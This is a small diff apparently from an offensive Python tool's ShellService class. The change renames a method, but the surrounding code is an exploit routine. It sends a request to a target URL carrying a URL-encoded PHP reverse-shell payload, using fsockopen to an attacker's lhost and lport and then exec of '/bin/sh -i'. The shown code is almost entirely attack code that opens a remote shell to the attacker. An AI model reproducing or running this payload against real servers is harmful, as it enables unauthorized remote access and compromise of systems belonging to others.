@@ -17,11 +17,11 @@ class ShellService:
 
     def execute_rev_shell(self):
         try:
-            requests.get(self.get_shell_code_url(), headers=DEFAULT_HEADERS, timeout=2)
+            requests.get(self.get_shell_code_url_with_payload(), headers=DEFAULT_HEADERS, timeout=2)
         except requests.exceptions.ReadTimeout:
             pass
 
-    def get_shell_code_url(self) -> str:
+    def get_shell_code_url_with_payload(self) -> str:
         if(self.is_linux()):
             shell_code = f'$sock=fsockopen("{self.lhost}",{self.lport});exec("/bin/sh -i <&3 >&3 2>&3");'
             payload = requests.utils.quote(f"php -r '{shell_code}'")
